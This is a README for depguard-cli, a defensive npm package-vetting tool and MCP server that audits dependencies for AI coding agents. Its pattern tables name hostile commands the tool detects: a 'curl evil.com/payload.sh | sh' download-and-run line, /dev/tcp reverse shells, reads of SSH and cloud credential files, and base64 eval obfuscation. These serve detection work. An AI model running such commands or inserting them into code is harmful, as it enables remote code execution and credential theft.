# depguard-cli

MCP security server for AI coding agents. 10 tools: **static code analysis**, pre-install guardian, AI hallucination guard, dead dependency detection, vulnerability audit, supply chain attack detection, and smart recommendations.

Your AI agent verifies every `npm install` before it happens. Now with **tarball download and source code scanning** that detects malware patterns, obfuscation, and behavioral mismatches with rich explanations. Zero runtime dependencies. Works with Claude, Cursor, Windsurf, and any MCP client.

## Install

```bash
npm install -g depguard-cli
```

Or use directly:

```bash
npx depguard-cli audit express
```

## CLI

```bash
# Full audit report (optionally pin a version)
depguard-cli audit <package[@version]> [--target-license MIT] [--json]

# Search npm for packages
depguard-cli search <keywords...> [--limit 10] [--json]

# Score a package 0-100
depguard-cli score <package> [--target-license MIT] [--json]

# Get install/write recommendation
depguard-cli should-use <intent...> [--threshold 60] [--json]

# Pre-install guardian (verify + audit + allow/warn/block)
depguard-cli guard <package> [--threshold 60] [--block] [--json]

# Detect unused dependencies
depguard-cli sweep [path] [--include-dev] [--json]

# Deep transitive dependency tree audit
depguard-cli audit-deep <package> [--json]

# AI code review (detect debris left by AI agents)
depguard-cli review [path] [--full] [--json]
```

### Examples

```bash
# Audit express for an Apache-2.0 project
depguard-cli audit express --target-license Apache-2.0

# Audit a specific installed version (not just latest)
depguard-cli audit express@4.17.1

# Find date formatting libraries
depguard-cli search date formatting --limit 5

# Score a package
depguard-cli score lodash --json

# Should I install or write my own?
depguard-cli should-use "http client" --threshold 70

# Check before installing — blocks nonexistent/typosquat packages
depguard-cli guard expresss
# [WARN] expresss
#   Possible typosquat of: express

# Find unused dependencies in your project
depguard-cli sweep . --include-dev
```

## API

```typescript
import { audit, search, score, shouldUse, guard, verify, sweep } from 'depguard-cli'

// Full audit report (now includes static code analysis)
const report = await audit('express', 'MIT')
console.log(report.vulnerabilities.total)      // 0
console.log(report.securityFindings)           // [] (clean) or SecurityFinding[]
console.log(report.codeAnalysis.filesAnalyzed) // 42
console.log(report.licenseCompatibility.compatible) // true
console.log(report.weeklyDownloads)            // 35000000

// Search packages
const results = await search('date formatting', { limit: 5 })
results.forEach(r => console.log(`${r.score}/100 ${r.name}`))

// Score 0-100
const result = await score('lodash', { targetLicense: 'MIT' })
console.log(result.total)       // 82
console.log(result.breakdown)   // { security: 100, maintenance: 75, ... }

// Install or write from scratch?
const rec = await shouldUse('http client')
console.log(rec.action)     // "install"
console.log(rec.package)    // "axios"
console.log(rec.reasoning)  // "axios scores 85/100 (≥60) — safe to install"

// Pre-install guardian — verify + audit + decision
const check = await guard('expresss')
console.log(check.exists)           // true (but suspicious)
console.log(check.possibleTyposquat) // true
console.log(check.similarTo)        // ["express"]
console.log(check.decision)         // "warn"

// AI hallucination guard — does this package even exist?
const exists = await verify('ai-hallucinated-pkg')
console.log(exists.exists)          // false

// Dead dependency detection
const sweepResult = await sweep('.', { includeDevDependencies: true })
console.log(sweepResult.unused)     // [{ name: 'lodash', status: 'unused', ... }]
console.log(sweepResult.estimatedSavingsKB) // 1400
```

## Scoring

Each package is scored 0-100 across five dimensions:

| Dimension | Weight | What it measures |
|-----------|--------|------------------|
| Security | 30% | Known CVEs, advisories, and static code analysis findings |
| Maintenance | 25% | Last publish date, version count, deprecation |
| Popularity | 20% | Weekly downloads (log scale) |
| License | 15% | Compatibility with your project license |
| Dependencies | 10% | Dependency count, install scripts |

Weights are configurable via the `weights` option in `score()`.

### Decision thresholds (`shouldUse`)

| Score | Action |
|-------|--------|
| >= 60 | `install` — safe to use |
| 40-59 | `caution` — review before using |
| < 40 | `write-from-scratch` — better to write your own |

The threshold is configurable via `--threshold` (CLI) or `threshold` option (API).

## Token Savings

Every MCP tool response includes a `tokenSavings` field that shows how many LLM tokens you save compared to manual research (web searches, page fetches, reasoning).

```json
"tokenSavings": {
  "responseTokens": 47,
  "manualEstimate": 11100,
  "saved": 11053,
  "percentSaved": 100,
  "manualSteps": [
    "WebSearch: \"{package} npm quality maintenance\" (~800 tokens)",
    "WebFetch: npm registry page (~3000 tokens)",
    "WebFetch: GitHub repo for activity/stars (~3000 tokens)",
    "WebSearch: \"{package} vulnerabilities\" (~800 tokens)",
    "WebFetch: advisories page (~3000 tokens)",
    "Reasoning: compute weighted score (~500 tokens)"
  ]
}
```

This is automatically included in every response — no configuration needed. It helps teams quantify the cost savings of using depguard in their AI workflows.

## MCP Server

depguard includes a built-in [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) server for AI agent integration. It works with **any MCP-compatible client**.

### Compatible AI clients

| Client | Configuration |
|--------|--------------|
| Claude Code | `.mcp.json` or `~/.claude/settings.json` |
| Claude Desktop | `claude_desktop_config.json` |
| Cursor | MCP settings in IDE |
| Windsurf | MCP settings in IDE |
| Continue.dev | `config.json` MCP section |
| Cline / Roo Code | MCP settings |

### Setup

Using npx (no install needed):

```json
{
  "mcpServers": {
    "depguard": {
      "command": "npx",
      "args": ["-y", "depguard-cli", "--mcp"]
    }
  }
}
```

Or if installed globally:

```json
{
  "mcpServers": {
    "depguard": {
      "command": "depguard-cli",
      "args": ["--mcp"]
    }
  }
}
```

Or via Claude Code CLI:

```bash
claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
```

### Available tools

| Tool | Description |
|------|-------------|
| `depguard_audit` | Full security audit with static code analysis, vulnerabilities, and install script scanning. Accepts optional `version` to audit a specific installed version. |
| `depguard_audit_bulk` | Audit multiple packages in a single call |
| `depguard_audit_project` | Audit all dependencies from a package.json file path. Scans transitive deps via lock file and audits the `packageManager` field. |
| `depguard_search` | Search npm for packages by keywords |
| `depguard_score` | Score a package 0-100 |
| `depguard_should_use` | Recommend install, use native Node.js, or write from scratch |
| `depguard_guard` | Pre-install guardian: verify, audit, allow/warn/block decision |
| `depguard_verify` | AI hallucination guard: check if a package exists + typosquatting |
| `depguard_sweep` | Dead dependency detection: find unused packages in a project |
| `depguard_audit_deep` | Deep transitive dependency tree audit with vulnerability aggregation |
| `depguard_review` | AI Code Review: detect debris left by AI agents (console.logs, empty catch, broken imports, orphan files) |

**Which tool should I use?**

| Situation | Tool |
|-----------|------|
| "I need X functionality" | `depguard_should_use` |
| "Install package Y" | `depguard_guard` |
| "Audit my project" | `depguard_audit_project` |
| "Compare A vs B vs C" | `depguard_audit_bulk` |
| "Deep dive on package Y" | `depguard_audit` |
| "Find a library for X" | `depguard_search` |
| "Clean up unused deps" | `depguard_sweep` |
| "Review my code" | `depguard_review` |

### Bulk audit

Audit all project dependencies in a single call. Accepts a list of package names or a dependencies object directly from `package.json`:

```typescript
// Via API
import { auditBulk } from 'depguard-cli'

const report = await auditBulk(['react', 'express', 'lodash'], { targetLicense: 'MIT' })
console.log(report.total)       // 3
console.log(report.vulnerable)  // 2
console.log(report.summary)     // { critical: 0, high: 2, moderate: 5, low: 3 }
```

Via MCP, the AI agent can pass the dependencies object from `package.json` directly — no need to extract package names manually.

### Project audit

Audit all dependencies from a `package.json` file in one call. When a lock file is present (`package-lock.json` or `pnpm-lock.yaml`), depguard also scans all transitive dependencies for known vulnerabilities and audits the `packageManager` field:

```typescript
import { auditProject } from 'depguard-cli'

const report = await auditProject('./package.json', {
  includeDevDependencies: true,  // also audit devDependencies
})

// Direct dependency audit results
console.log(report.summary)            // { critical: 0, high: 2, moderate: 5, low: 3 }

// Transitive dependency vulnerabilities (from lock file)
console.log(report.transitiveSummary)  // { totalDeps: 800, vulnerable: 12, critical: 1, ... }

// Package manager audit (e.g. yarn@4.5.3)
console.log(report.packageManagerAudit?.vulnerabilities)
```

Via MCP, the agent just passes the file path — depguard reads it, detects the project license, scans the lock file for transitive deps, and audits everything.

## Pre-Install Guardian

The `guard` command is the recommended entry point for AI agents. Before installing any package, it runs three checks in sequence:

1. **Existence check** — Does the package exist on npm? (blocks AI hallucinations)
2. **Typosquatting detection** — Is the name suspiciously similar to a popular package? (Levenshtein distance against 100+ top packages)
3. **Security audit** — Score, vulnerabilities, deprecated status, install script analysis

```bash
# Safe package
depguard-cli guard express
# [ALLOW] express
#   Score: 82/100 — safe to install

# Typosquat attempt
depguard-cli guard expresss
# [WARN] expresss
#   Possible typosquat of: express
#   Score: 45/100 is below threshold 60

# Nonexistent package (AI hallucination)
depguard-cli guard ai-made-up-package
# [BLOCK] ai-made-up-package
#   Package does NOT exist on npm!
```

Use `--block` to escalate all warnings to blocks (useful in CI):

```bash
depguard-cli guard sketchy-lib --block
```

### AI Hallucination Guard

The `verify` tool is a lightweight version of `guard` — it only checks if a package exists and whether the name is a possible typosquat. No audit, no scoring. Fast enough to run on every `npm install` suggestion from an AI agent.

```typescript
import { verify } from 'depguard-cli'

const result = await verify('expresss')
console.log(result.exists)           // true
console.log(result.possibleTyposquat) // true
console.log(result.similarTo)        // ["express"]
```

## Dead Dependency Detection

The `sweep` command scans your project to find npm packages listed in `package.json` but not actually imported or used in source code.

```bash
depguard-cli sweep . --include-dev

# Scanned 42 files, 15 dependencies
#
# Unused (3):
#   - lodash@^4.17.21 (~1400 KB)
#   - moment@^2.29.4 (~800 KB)
#   - request@^2.88.2 (~250 KB)
#
# Maybe unused (1):
#   ? some-dev-tool@^1.0.0
#
# Estimated savings: ~2450 KB
```

**Smart detection:**
- Scans all `.js`, `.ts`, `.mjs`, `.cjs`, `.jsx`, `.tsx` files for `import`/`require`/`export from`
- Recognizes config-only dependencies (eslint, prettier, typescript, jest, vitest, babel, tailwind, etc.)
- Detects binaries used in npm scripts
- Handles `@types/*` packages paired with runtime dependencies
- Marks untraced devDependencies as "maybe-unused" instead of "unused"
- Estimates disk size savings

```typescript
import { sweep } from 'depguard-cli'

const result = await sweep('.', { includeDevDependencies: true })
console.log(result.unused)            // [{ name: 'lodash', estimatedSizeKB: 1400, ... }]
console.log(result.estimatedSavingsKB) // 2450
```

## Smart Advisor

The `should_use` tool now checks for native Node.js alternatives before recommending npm packages:

```
"I need an http client"     → Use native fetch() (Node 18+). No package needed.
"I need uuid generation"    → Use crypto.randomUUID() (Node 19+). No package needed.
"I need deep cloning"       → Use structuredClone() (Node 17+). No package needed.
"I need a date formatter"   → Install date-fns (score 85). No native alternative.
```

Covers 20+ common intents including fetch, uuid, hashing, URL parsing, CLI args, testing, SQLite, glob, streams, compression, and more. Each recommendation includes example code and the minimum Node.js version required.

## Fix Suggestions

When vulnerabilities are found, each audit report includes actionable fix suggestions:

```json
"fixSuggestions": [
  {
    "vulnerability": "Prototype Pollution",
    "severity": "high",
    "currentVersion": "4.17.19",
    "fixVersion": "4.17.21",
    "action": "upgrade"
  }
]
```

If no patch exists, `action` is `"no-fix-available"`.

## GitHub Token

For higher GitHub Advisory API rate limits (60/hour → 5,000/hour), set a GitHub token:

```bash
export GITHUB_TOKEN=ghp_your_token_here
```

No special scopes needed — the token only identifies you for rate limiting. If already set (e.g. by `gh` CLI or GitHub Actions), depguard uses it automatically.

## Install Script Analysis

depguard statically analyzes install scripts (`preinstall`, `install`, `postinstall`) for suspicious patterns commonly used in supply chain attacks:

| Pattern | Severity | Example |
|---------|----------|---------|
| Remote code execution | Critical | `curl evil.com/payload.sh \| sh` |
| Reverse shells | Critical | `/dev/tcp/` connections |
| Credential file access | Critical | Reading `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
| Sensitive env vars | Critical | Accessing `$NPM_TOKEN`, `$AWS_SECRET` |
| Shell typosquatting | Critical | `/bin/ssh` instead of `/bin/sh` |
| Obfuscated code | High | `eval(Buffer.from(..., "base64"))` |
| Process spawning | High | `child_process`, `exec()`, `spawn()` |
| Environment access | High | `process.env` usage |
| External network calls | Moderate | HTTP requests to non-standard hosts |

Each audit report includes a `scriptAnalysis` field with `suspicious` (boolean) and `risks` (array of detected patterns with severity and description). No scripts are executed — analysis is purely static pattern matching.

## Static Code Analysis

**New in v1.6.0.** depguard downloads the package tarball from npm, extracts JS files, and scans for 18+ malware patterns across 6 threat categories:

| Category | Severity | What it detects |
|----------|----------|-----------------|
| `malware` | Critical | Eval of decoded payloads, reverse shells (net.connect), crypto mining (stratum+tcp) |
| `data-exfiltration` | Critical/High | JSON.stringify(process.env), Object.keys(process.env), dynamic fetch URLs, credential file reads |
| `code-execution` | High | eval(), new Function(), child_process.exec/spawn, shell spawning |
| `obfuscation` | High/Medium | Long hex/unicode strings, base64 payloads, minified source in non-.min.js files |
| `unexpected-behavior` | High/Medium | Network calls in a "formatter" package, filesystem access in a "date utility" |
| `supply-chain` | Critical | Typosquatting patterns in install scripts |

Every finding includes a rich `SecurityFinding` object:

```typescript
interface SecurityFinding {
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  category: 'malware' | 'supply-chain' | 'vulnerability' | 'obfuscation' | 'data-exfiltration' | 'unexpected-behavior' | 'code-execution'
  title: string           // "Serialization of entire environment"
  explanation: string     // Rich, human-readable explanation of WHY it's dangerous
  evidence: string        // The exact code that triggered the detection
  file: string            // Where it was found (e.g. "src/index.js")
  recommendation: string  // What to do about it
}
```

### Behavioral Mismatch Detection

depguard compares the package description and keywords against detected code behavior. A "string formatter" that makes network calls or a "date utility" that reads the filesystem is flagged as `unexpected-behavior` with a detailed explanation.

### Impact on Scoring

Critical code analysis findings cap the security score at 20/100. High findings cap at 45/100. This ensures that packages with suspicious source code cannot achieve high scores regardless of popularity or maintenance status.

## Data sources

depguard combines two advisory databases for maximum coverage:

| Source | What it catches |
|--------|----------------|
| **npm Registry** | Advisories from `npm audit` |
| **GitHub Advisory Database** | GHSA advisories, often not in npm |

Results are deduplicated, filtered by the current package version (only vulnerabilities that actually affect the installed version are reported), and each advisory includes a `source` field (`npm` or `github`).

### Caching

Results are cached in memory (5 min) and on disk at `~/.depguard/cache/` (24h). This means:
- Repeated audits of the same package are instant (no network requests)
- Cache survives process restarts
- Expired entries are cleaned up automatically on startup

## License compatibility

depguard checks license compatibility using a permissive-to-copyleft hierarchy:

```
Public Domain (Unlicense, CC0) → Permissive (MIT, ISC, BSD, Apache-2.0)
  → Weak Copyleft (LGPL, MPL) → Strong Copyleft (GPL) → Network (AGPL)
```

A dependency is compatible if its license is equally or more permissive than your project's target license.

## Design principles

- **Zero runtime dependencies** — only Node.js built-in APIs (`fetch`, `crypto`, `readline`)
- **Never throws on network errors** — returns degraded results with warnings
- **TypeScript strict mode** — full type safety
- **100% offline tests** — all tests use mock fetch
- **Cache-friendly** — 5-minute in-memory TTL to avoid rate limits

## Development

```bash
npm run build    # compile TypeScript
npm run lint     # ESLint (strict)
npm test         # 238 tests (all offline)
npm run check    # build + lint + test + audit
```

## License

Apache-2.0 — see [LICENSE](LICENSE) for details.
